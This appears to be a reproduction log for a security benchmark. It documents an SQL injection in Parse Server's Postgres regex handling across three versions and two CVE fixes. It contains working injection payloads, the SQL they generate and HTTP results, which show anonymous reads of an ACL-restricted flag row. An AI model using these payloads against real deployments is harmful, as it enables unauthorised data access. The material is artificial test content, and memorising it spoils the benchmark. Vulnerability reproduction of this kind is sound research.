# repro.log — parse-server-literalizeRegexPart-pg-sqli
# CVE-2024-27298 (V1=6.5.0, incomplete fix, TARGET) -> CVE-2024-39309 (V2=6.5.7, complete fix)
# gate run: 2026-07-13, real Docker (node:18 + postgis/postgis:14-3.4)
# per-run flag (seeded via Parse REST masterKey into an ACL-restricted Vault row):
#   PCBFLAG_6e67b2196db4748aca36a897be2d7ced

########################################################################
# SINK (identical byte-for-byte at 6.4.0 / 6.5.0 / 6.5.7)
#   src/Adapters/Storage/Postgres/PostgresStorageAdapter.js  (find(), ~line 757)
#     patterns.push(`$${index}:raw ${operator} '$${index + 1}:raw'`);
#     values.push(name, regex);        // regex = processRegexPattern($regex), inserted RAW
#   => final SQL fragment:   <col> ~ '<processRegexPattern output>'
# The fix is ONLY in the escaping helper literalizeRegexPart (same file), NOT the sink.
########################################################################

## literalizeRegexPart single-quote escaping — evolution (verbatim tail)
# V0 6.4.0 (pre-fix, fully vulnerable):
#     .replace(/([^'])'/, `$1''`)          // NO /g flag -> only the FIRST quote is doubled
#     .replace(/^'([^'])/, `''$1`);
# V1 6.5.0 (CVE-2024-27298 fix = commit cbefe770a726, PR #8961):
#     .replace(/([^'])'/g, `$1''`)         // /g added -> ALL quotes preceded by a non-quote doubled
#     .replace(/^'([^'])/, `''$1`);
# V2 6.5.7 (CVE-2024-39309 fix = commit 2edf1e4c0363, PR #9167):
#     .replace(/'+/g, match => {           // normalise every quote-RUN to an EVEN length
#       return match.length % 2 === 0 ? match : match + "'";
#     });
# Both advisories: "The algorithm to detect SQL injection has been improved." (same wording).

## PAYLOADS  ($regex value on the queryable Vault.name field; anonymous, appId only, NO masterKey)
#   original (CVE-2024-27298) : a'b' OR 1=1 --      (two SEPARATED single quotes)
#   residual (CVE-2024-39309) : a'' OR 1=1 --       (one EVEN run of two consecutive quotes)

## Escaping outcome (confirmed against real Parse Server via Postgres statement log)
#   original -> V0: a''b'  OR 1=1 --   (2nd quote unescaped -> BREAKOUT)
#   original -> V1: a''b'' OR 1=1 --   (both doubled -> balanced -> BLOCKED)
#   residual -> V1: a'''   OR 1=1 --   (even run -> odd 3 quotes -> dangling BREAKOUT)
#   residual -> V2: a''    OR 1=1 --   (even run kept even -> balanced -> BLOCKED)

########################################################################
# CANARY (planted in the ENVIRONMENT, not app code): oracle seeds via Parse REST
#   masterKey POST /parse/classes/Vault
#     secretrow : { name:"secretrow", secret:${PCB_FLAG}, ACL:{} }   -> _rperm = {}  (restricted)
#     publicrow : { name:"publicrow", secret:"decoy...", ACL:{"*":{read,write}} } -> _rperm = {*}
#   Postgres row-level check (v1): SELECT "objectId",name,secret,_rperm FROM "Vault";
#     O7GBrKgXOX | secretrow | PCBFLAG_6e67b2196db4748aca36a897be2d7ced | {}
#     JAYtLhnA8I | publicrow | decoy-not-the-flag                       | {*}
#   Anonymous benign query (regex "publicrow") on V0 and V1 returns ONLY publicrow
#   (flag_in_response=false) => ACL/_rperm filter genuinely protects the flag row.
########################################################################

## ACTUAL GENERATED SQL (from Postgres log_statement=all on pg_v1)
# original @ v1 (BLOCKED — balanced literal, _rperm filter intact -> empty ACL -> 0 rows):
  SELECT * FROM "Vault" WHERE "name" ~ 'a''b'' OR 1=1 -- ' AND ("_rperm" IS NULL OR "_rperm" && ARRAY['*','*'])  LIMIT 100
# residual @ v1 (INJECTION — 'a''' closes early, OR 1=1 -- comments out the _rperm ACL filter -> all rows):
  SELECT * FROM "Vault" WHERE "name" ~ 'a''' OR 1=1 -- ' AND ("_rperm" IS NULL OR "_rperm" && ARRAY['*','*'])  LIMIT 100

## RUNTIME RESULTS (HTTP GET /parse/classes/Vault?where={"name":{"$regex":<payload>}}, appId only)
# V0 = parse-server 6.4.0 (port 39640)
  original a'b' OR 1=1 --  : 200  results=[secretrow(FLAG), publicrow]   FLAG-HIT
  benign   "publicrow"     : 200  results=[publicrow]                    no-flag (ACL holds)
# V1 = parse-server 6.5.0 (port 39650) — CVE-2024-27298 patched = TARGET
  original a'b' OR 1=1 --  : 200  results=[]                             BLOCKED (seed precondition)
  residual a'' OR 1=1 --   : 200  results=[secretrow(FLAG), publicrow]   FLAG-HIT (residual confirmed)
  benign   "publicrow"     : 200  results=[publicrow]                    no-flag (ACL holds)
# V2 = parse-server 6.5.7 (port 39657) — CVE-2024-39309 patched
  original a'b' OR 1=1 --  : 200  results=[]                             BLOCKED
  residual a'' OR 1=1 --   : 200  results=[]                             BLOCKED

